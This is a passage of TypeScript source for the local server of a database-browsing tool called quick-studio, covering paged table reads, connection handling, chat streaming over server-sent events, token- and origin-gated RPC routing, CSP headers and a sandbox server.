   * pager can therefore also DRIFT — an insert/delete before the current offset shifts
   * every later row, so a row can be seen twice or skipped across two page requests —
   * and the last page can be reported non-empty yet come back empty. This is deliberately
   * tolerated: quick-studio is a local, single-user browse tool where a best-effort
   * snapshot is worth far more than the cost of holding a transaction (or a repeatable-read
   * snapshot) open across the pager's lifetime. Keyset/seek pagination — the real fix — is
   * deliberately NOT implemented. Removing the writers does NOT make contiguity universal:
   * with no writers it is GUARANTEED only on `planTableRows`'s two TOTAL-order branches —
   * the primary key and the physical row locator (`ctid`, DW-33). The orderable-column
   * branch is best-effort (an ORDER BY over non-unique columns is not a total order, so
   * rows sharing the ordered values may come back in a different relative order between two
   * page requests even with zero writes), and a relation with no PK, no locator and no
   * orderable column still gets NO ORDER BY at all — the documented DW-33 residual, whose
   * page order is non-total by construction.
   */
  async function tableRows(params: unknown): Promise<RpcReply<TableRowsResult>> {
    const target = readConnectionId(params, "table.rows");
    if ("error" in target) return target.error;
    try {
      const resolved = connectionTargets.resolve(target.id);
      if (!resolved.ok) return targetError(resolved.reason);
      const { seams } = resolved;
      const schema = await seams.getSchema();
      const planned = planTableRows(schema, params, (ident) => seams.quoteIdent(ident));
      if (!planned.ok) {
        return errorReply(planned.error.code, planned.error.message);
      }
      const { plan } = planned;
      const countResult = await seams.runQuery(plan.countSql, []);
      const total = readTotal(countResult.rows);
      const dataResult = await seams.runQuery(plan.selectSql, []);
      // `plan.columns` are introspected `SchemaColumnInfo`s, so they ALREADY carry the
      // engine's own `data_type`; passing the descriptors (not just the names) is what
      // gives the browse grid its SQL-typed colour/alignment and its wall-clock naive
      // timestamps (DW-30/34) with no extra query.
      const data = rowsToFrozenData(plan.columns, dataResult.rows);
      return okReply({ data, page: plan.page, pageSize: plan.pageSize, total });
    } catch (err) {
      if (err instanceof NoConnectionTargetError) {
        return errorReply("bad_request", "no active connection");
      }
      throw err; // genuine driver bug → dispatch → internal_error (unchanged)
    }
  }

  /**
   * Connect capability (Story 1.3; targeted in Story 10.4): resolve the requested
   * connection (absent/`null` id ⇒ the boot manager, so the UI's paramless call is
   * byte-identical) and open+introspect it idempotently. A CLASSIFIED driver failure
   * rides INSIDE `okReply` as the neutral `{status:"failed"}` domain payload — never an
   * error envelope; only a malformed id or an unresolvable target produces one.
   */
  async function connect(params: unknown): Promise<RpcReply<ConnectResult>> {
    const target = readConnectionId(params, "connect");
    if ("error" in target) return target.error;
    const resolved = connectionTargets.resolve(target.id);
    if (!resolved.ok) return targetError(resolved.reason);
    return okReply(await resolved.seams.connect());
  }

  // Guarded SQL executor (Story 3.1): the ONE Core-owned risk classifier. Its single
  // dependency is `resolveConnection` (Story 6.2): resolve the target's seams once per
  // `execute` (default boot). `runQuery` (committing path) and `runReadOnly`
  // (auto-classified reads in an engine read-only transaction) delegate to the resolved
  // manager's driver; `getEngine`/`getSchema` resolve it lazily+once; `quoteIdent` is
  // the engine-correct identifier quoter. A malformed/smuggling request is rejected
  // before any composed SQL runs (and before any target round-trip).
  const executor = createExecutor({
    resolveConnection: (connectionId) => connectionTargets.resolve(connectionId),
  });

  // Chat responder (Story 5.2, streamed in Story 5.4): the SOLE outbound provider
  // caller. Closes over the live schema source, the Core-internal `getKey`, and the
  // unified model resolver; the streaming call defaults to `streamText`, so every
  // `ai`/`@ai-sdk/*` touch stays in Ring 1 (chat.ts). Schema-only, zero rows leave.
  // Story 10.4: the schema source is now per-request — the optional `connectionId` on the
  // `/chat/stream` body selects WHICH database is introspected (absent/null ⇒ boot). A
  // resolve miss raises the same typed `NoConnectionTargetError` the read path uses, which
  // `prepareRequest`'s existing catch turns into the neutral "no active connection"
  // `bad_request` — no new chat error code, and the id never reaches the provider.
  const chatResponder = createChatResponder({
    getSchema: (connectionId) => {
      const resolved = connectionTargets.resolve(connectionId);
      if (!resolved.ok) throw new NoConnectionTargetError();
      return resolved.seams.getSchema();
    },
    getKey: (provider) => providerRegistry.getKey(provider),
    resolveModel,
  });

  const sseHeaders = {
    "content-type": "text/event-stream; charset=utf-8",
    "cache-control": "no-store",
    "x-content-type-options": "nosniff",
    connection: "keep-alive",
  } as const;

  /**
   * Chat streaming capability (Story 5.4): pump `responder.answerStream(params, signal)`
   * as a `text/event-stream` — one `data: <json ChatStreamChunk>\n\n` per part. The
   * generator is total (a pre-flight failure / mid-stream throw is itself a redacted
   * `error` chunk), so this only closes the stream when the generator ends. The raw
   * key never appears in any chunk (redacted, stderr-only in Core).
   *
   * Controller-safe on client disconnect (P1/P2): `req.signal` is threaded into the
   * generator so the (billable) provider stream is torn down instead of pulled to
   * completion; a live reference to the async iterator lets `cancel()` (and a `finally`)
   * close it promptly; and every `enqueue`/`close` on a possibly-dead controller is
   * guarded — once the reader is gone we STOP pumping (never re-enqueue a fallback on a
   * dead controller), so no unhandled rejection escapes per aborted stream.
   */
  function chatStreamResponse(params: unknown, signal: AbortSignal): Response {
    const encoder = new TextEncoder();
    // Hold the live iterator so a client disconnect can close it (via `cancel()` and
    // the `finally`), stopping provider-stream iteration promptly.
    const iterator = chatResponder.answerStream(params, signal);
    const stream = new ReadableStream<Uint8Array>({
      async start(controller) {
        try {
          for await (const chunk of iterator) {
            try {
              controller.enqueue(encoder.encode(`data: ${JSON.stringify(chunk)}\n\n`));
            } catch {
              // The controller is dead (client gone): stop pumping. The `finally`
              // closes the generator — do NOT re-enqueue on a dead controller.
              break;
            }
          }
        } catch {
          // Defense-in-depth: `answerStream` is total, but if it ever throws, close
          // with a neutral redacted error frame rather than a dangling stream. Guard
          // the enqueue too — the controller may already be dead.
          try {
            const fallback: ChatStreamChunk = {
              type: "error",
              code: "internal_error",
              message: "stream failed",
            };
            controller.enqueue(encoder.encode(`data: ${JSON.stringify(fallback)}\n\n`));
          } catch {
            // Controller already dead — nothing to flush.
          }
        } finally {
          // Always release the generator (closes the provider stream on any exit path).
          await iterator.return?.(undefined);
        }
        try {
          controller.close();
        } catch {
          // Controller already closed/errored (client gone) — nothing to close.
        }
      },
      // Client disconnected: stop pulling the provider's stream promptly.
      async cancel() {
        await iterator.return?.(undefined);
      },
    });
    return new Response(stream, { status: 200, headers: sseHeaders });
  }

  const server = Bun.serve({
    hostname: bindHost,
    port,
    async fetch(req): Promise<Response> {
      const url = new URL(req.url);
      const boundPort = server.port ?? 0;
      const rpcContext: RpcContext = {
        // Ack-before-teardown: NEVER call `onShutdownRequested` synchronously
        // here — it would close the socket carrying this very reply. Deferring
        // to a macrotask lets Bun flush the `/rpc` Response first.
        requestShutdown: () => setTimeout(onShutdownRequested, 0),
        // Idempotent open+introspect of the resolved target; a live connection is reused
        // across calls (and, for a saved id, across every read path — one shared pool).
        connect,
        // Read-only descriptor of the in-memory active target + run mode (Story 8.7).
        // Pure: derives from the held url, opens no driver, mutates nothing.
        // `hasTarget` rides alongside (Story 10.5): `describe()` answers null for both
        // "nothing configured" and "configured but undescribable", so the schema tree
        // needs the bare existence bit to tell a boot-less session from a broken boot url.
        activeConnection: () => ({
          mode,
          connection: connectionManager.describe(),
          hasTarget: connectionManager.hasTarget(),
        }),
        // Manage-connections registry (lazily opens the store on first call).
        connections: connectionRegistry,
        // Workspace-state registry (lazily opens the store on first call).
        workspace: workspaceRegistry,
        // AI provider-key registry (lazily opens the store on first call).
        providers: providerRegistry,
        // Browse-rows read path (composes the Core-owned SELECT on the live conn).
        tableRows,
        // Guarded SQL execution (the single risk classifier + composer).
        execute: (params) => executor.execute(params),
        // Live Report registry: publish layout+SQL docs to serve same-origin (Story 6.4).
        liveReports: liveReportRegistry,
      };

      // --- Static UI assets ---------------------------------------------
      if (req.method === "GET" && (url.pathname === "/" || url.pathname === "/index.html")) {
        // `shellHeaders` (not `htmlHeaders`): the token-bearing shell carries the strict
        // per-boot CSP + `x-frame-options: DENY` on top of the unchanged content-type /
        // `no-store` / `nosniff` contract. Both paths share one Response shape, so the
        // alias `/index.html` is byte-identical to `/`.
        return new Response(indexHtmlTemplate, { status: 200, headers: shellHeaders });
      }
      if (req.method === "GET" && url.pathname === "/app.js") {
        return new Response(appJs, {
          status: 200,
          headers: {
            "content-type": "text/javascript; charset=utf-8",
            "x-content-type-options": "nosniff",
          },
        });
      }
      // The offline Snapshot runtime (Story 6.3): served from the CORE origin (like
      // `/app.js`) — open, no token, data-free renderer code. Ring 2 reads it with a
      // same-origin relative `fetch` at export time and inlines it into the exported file;
      // it MUST live here (not on the sandbox origin, which sets no CORS headers).
      if (req.method === "GET" && url.pathname === "/snapshot-runtime.js") {
        return new Response(snapshotBundle.js, {
          status: 200,
          headers: {
            "content-type": "text/javascript; charset=utf-8",
            "x-content-type-options": "nosniff",
          },
        });
      }
      // The Live Report runtime (Story 6.4): served open + data-free (like `/snapshot-runtime.js`)
      // so the Ring-2 portable-copy path can fetch it same-origin at export time and inline it.
      if (req.method === "GET" && url.pathname === "/live-report-runtime.js") {
        return new Response(liveReportBundle.js, {
          status: 200,
          headers: {
            "content-type": "text/javascript; charset=utf-8",
            "x-content-type-options": "nosniff",
          },
        });
      }
      // A published Live Report served same-origin (Story 6.4): the Core injects its per-boot
      // session token into the page (mirroring `renderIndexHtml`, `no-store`) so the inlined
      // runtime can re-query via the UNCHANGED `/rpc` gate as an explicit second caller. The
      // published doc carries only layout+SQL — no data, no credential. An unknown id → 404.
      if (req.method === "GET" && url.pathname.startsWith("/live/")) {
        const id = url.pathname.slice("/live/".length);
        const doc = liveReportRegistry.get(id);
        if (doc === null) {
          // A registry miss (unknown id, or a link from a previous boot the in-memory
          // session-only registry no longer holds): a small human-readable page instead of a
          // bare 404 body, so a stale/shared link explains itself rather than looking broken.
          return new Response(
            `<!doctype html><html lang="en"><head><meta charset="utf-8" /><title>quick-studio — live report not found</title></head><body><p>This live report link is unknown or has expired — re-export it from quick-studio.</p></body></html>`,
            { status: 404, headers: htmlHeaders },
          );
        }
        return new Response(assembleLiveReportHtml(doc, liveReportBundle.js, token), {
          status: 200,
          headers: liveHtmlHeaders,
        });
      }
      if (req.method === "GET" && url.pathname === "/app.css") {
        return new Response(appCss, {
          status: 200,
          headers: {
            "content-type": "text/css; charset=utf-8",
            "x-content-type-options": "nosniff",
          },
        });
      }

      // --- Gated chat streaming endpoint (Story 5.4) --------------------
      // Same two gates as `/rpc` (Origin/Host then token), then an SSE stream of
      // `ChatStreamChunk`s. Kept off `/rpc` because a streaming `ReadableStream`
      // Response cannot ride the single-JSON dispatch envelope.
      if (url.pathname === "/chat/stream") {
        if (req.method !== "POST") {
          return jsonResponse(
            errorReply("method_not_allowed", "Chat stream endpoint accepts POST only"),
            405,
          );
        }
        const origin = req.headers.get("origin");
        const host = req.headers.get("host");
        if (!validateOrigin(origin, host, bindHost, boundPort)) {
          return jsonResponse(errorReply("forbidden_origin", "Foreign Origin or Host header"), 403);
        }
        const provided = req.headers.get(TOKEN_HEADER);
        if (!validateToken(provided, token)) {
          return jsonResponse(errorReply("unauthorized", "Missing or invalid session token"), 403);
        }
        // Resource-exhaustion guard (after the gates): reject an over-limit body
        // before `req.json()` buffers it whole into memory.
        const overLimit = bodyLimitResponse(req);
        if (overLimit) return overLimit;
        let params: unknown;
        try {
          params = await req.json();
        } catch {
          return jsonResponse(errorReply("bad_request", "Body is not valid JSON"), 400);
        }
        // Validation of `params` (provider/message) happens INSIDE `answerStream` and
        // rides as a terminal `error` chunk, so the response is always a 200 stream.
        // `req.signal` (Bun aborts it on client disconnect) tears down the provider call.
        return chatStreamResponse(params, req.signal);
      }

      // --- Gated RPC endpoint -------------------------------------------
      if (url.pathname === "/rpc") {
        if (req.method !== "POST") {
          return jsonResponse(
            errorReply("method_not_allowed", "RPC endpoint accepts POST only"),
            405,
          );
        }

        // Gate 1: Origin/Host (defense-in-depth, anti-DNS-rebinding). Checked
        // BEFORE the token so a cross-origin / rebound caller is rejected on the
        // cheap check and never learns whether a supplied token was valid.
        const origin = req.headers.get("origin");
        const host = req.headers.get("host");
        if (!validateOrigin(origin, host, bindHost, boundPort)) {
          return jsonResponse(
            errorReply("forbidden_origin", "Foreign Origin or Host header"),
            403,
          );
        }

        // Gate 2: token (the real auth boundary).
        const provided = req.headers.get(TOKEN_HEADER);
        if (!validateToken(provided, token)) {
          return jsonResponse(
            errorReply("unauthorized", "Missing or invalid session token"),
            403,
          );
        }

        // Resource-exhaustion guard (after the gates): reject an over-limit body
        // before `req.json()` buffers it whole into memory.
        const overLimit = bodyLimitResponse(req);
        if (overLimit) return overLimit;

        // Parse + dispatch.
        let parsed: unknown;
        try {
          parsed = await req.json();
        } catch {
          return jsonResponse(errorReply("bad_request", "Body is not valid JSON"), 400);
        }
        if (typeof parsed !== "object" || parsed === null || typeof (parsed as { method?: unknown }).method !== "string") {
          return jsonResponse(
            errorReply("bad_request", "RPC request must be an object with a string method"),
            400,
          );
        }

        const reply = await dispatch(parsed as { method: string; params?: unknown }, rpcContext);
        if (reply.ok) {
          return jsonResponse(reply, 200);
        }
        // Map error codes to HTTP status: internal_error → 500, not_found → 404,
        // everything else (unknown_method/bad_request/…) → 400 (unauthorized/
        // forbidden_origin/method_not_allowed handled above).
        const status =
          reply.error.code === "internal_error"
            ? 500
            : reply.error.code === "not_found"
              ? 404
              : 400;
        return jsonResponse(reply, status);
      }

      return jsonResponse(errorReply("not_found", "Not found"), 404);
    },
  });

  // Declared after `server` (its default closes over it) but before any
  // request can be dispatched — Bun only invokes `fetch` once this synchronous
  // setup has run to completion, so the closure is always well-formed by then.
  const onShutdownRequested =
    options.onShutdownRequested ?? (() => { void server.stop(true); });

  const boundPort = server.port ?? 0;

  // Ring 3 sandbox origin (Story 5.5): a SECOND `Bun.serve` on a distinct ephemeral
  // port — a genuinely separate origin serving only the untrusted guest doc + its
  // bundle under a locked-down CSP. Started synchronously (Bun.serve binds before
  // returning) so its origin is known before the HTML shell is rendered. Torn down
  // alongside the Core in `stop()`.
  //
  // `bindHost` is passed as a REQUEST, not a decree (DW-48): `startSandboxServer`
  // clamps it to loopback, so the sandbox binds `127.0.0.1`/`::1` even when the Core
  // itself is exposed via `QS_HOST=0.0.0.0`. That asymmetry is intentional — the Core at
  // least HAS an authentication gate (the per-boot session token on `/rpc`),
  // whereas the guest origin has no credential of any kind, so exposing it exposes
  // something with nothing left to fail closed on. Note the argument deliberately rests
  // on "the guest has no gate", not on "the token is airtight": the same exposed Core
  // serves `/live/<id>`, which injects that token into a page meant to be opened by
  // link, so the token is not a boundary this decision should lean on.
  //
  // The accepted cost is stated on all three exposure surfaces (stderr warning, README,
  // in-page `ExposureBanner`): in exposed mode the injected `__QS_SANDBOX_ORIGIN__`
  // resolves against the VIEWER's loopback, so a chat answer carrying a chart does not
  // render off-host — the chart AND the prose narration it displaces are both missing,
  // while the SQL and the result table still render (`ChatQueryRun` is not gated on the
  // chart). The Core's own bind is untouched by any of this.
  const startSandbox = options.startSandboxServer ?? startSandboxServer;
  const sandboxServer = startSandbox({ host: bindHost, port: 0, bundle: sandboxBundle });
  const sandboxOrigin = sandboxServer.origin;

  // Rendered after `server` so the exposure payload can carry the real bound
  // port. Bun only invokes `fetch` once this synchronous setup completes, so
  // the closure's reference is always resolved by request time.
  // Story 11.7: purely a UI-routing hint, resolved by `bin/` BEFORE this boot ever
  // starts (see `StartCoreOptions.firstRun`'s doc for why the order is load-bearing).
  // Defaulted here — not just in the type — so a caller that omits it entirely
  // (every pre-11.7 call site, including this file's own tests) renders `false`.
  const firstRun = options.firstRun ?? false;

  const indexHtmlTemplate = renderIndexHtml(
    token,
    { exposed, host: bindHost, port: boundPort },
    sandboxOrigin,
    cspNonce,
    firstRun,
  );

  // The shell's strict CSP (DW-2). Built HERE, not at module scope, because it is the
  // only point where BOTH boot-dependent inputs exist: the per-boot nonce and the Ring
  // 3 `sandboxOrigin`, which is only known once `startSandbox` has bound its ephemeral
  // port. Precomputed once (the policy is constant for the boot, like the template it
  // accompanies) and served on `GET /` + `/index.html` in place of the bare
  // `htmlHeaders`. `htmlHeaders` itself stays exactly as it was — the `/live/` 404 page
  // still uses it, and `liveHtmlHeaders` still spreads it, and neither of those pages
  // is in DW-2's scope.
  const shellHeaders = shellCspHeaders(cspNonce, sandboxOrigin);

  // Both fail-closed corners of that policy are SILENT in the browser: the degraded
  // shell is a valid page under a valid CSP whose inline scripts (or whose sandbox
  // frame) are simply refused, and the only signal is a devtools console nobody has
  // open. Neither branch is reachable today — `mintCspNonce` always produces a minted
  // nonce and `deriveOpenUrl` always produces a real authority — which is exactly why a
  // regression in either would present as an unexplained white screen. One line on the
  // server's own stderr turns that into a diagnosis. The nonce VALUE is never printed:
  // it stays in-memory-only, per `mintCspNonce`'s contract.
  if (!shellHeaders["content-security-policy"]?.includes("'nonce-")) {
    console.warn(
      "[csp] app-shell nonce was rejected as malformed — inline scripts will be refused and the UI will not boot",
    );
  }
  if (!isUsableSandboxOrigin(sandboxOrigin)) {
    console.warn(
      `[csp] unusable sandbox origin ${JSON.stringify(sandboxOrigin)} — frame-src falls back to 'none' and chat answers carrying a chart will not render`,
    );
  }

  const url = `http://${bindHost}:${boundPort}`;
  const openUrl = deriveOpenUrl(bindHost, boundPort);
  return {
    url,
    host: bindHost,
    port: boundPort,
    token,
    exposed,
    mode,
    openUrl,
    sandboxOrigin,
    // Teardown closes the DB driver FIRST (so no socket/pool lingers past
    // `stop()`), then releases both the Core and the sandbox ports. `close()`
    // swallows its own errors, so a wedged driver can never block shutdown. The
    // sandbox teardown is wrapped in a `finally` so a throw/reject from
    // `sandboxServer.stop()` can NEVER skip the Core `server.stop()` — both ports
    // are always released, never orphaned by an ordering accident.
    stop: async () => {
      // Close every lazily-opened re-target manager (Story 6.2) alongside the boot
      // manager, and latch the resolver closed so a resolve racing shutdown can never
      // open a new (leaked) target. `closeAll`/`close` both swallow teardown errors.
      await connectionTargets.closeAll();
      await connectionManager.close();
      // Release the credential store's single-writer lock (DW-14) so a relaunch
      // needs no reclaim. Best-effort — `close()` swallows its own errors.
      connectionRegistry.close();
      try {
        await sandboxServer.stop();
      } finally {
        await server.stop(true);
      }
    },
  };
}
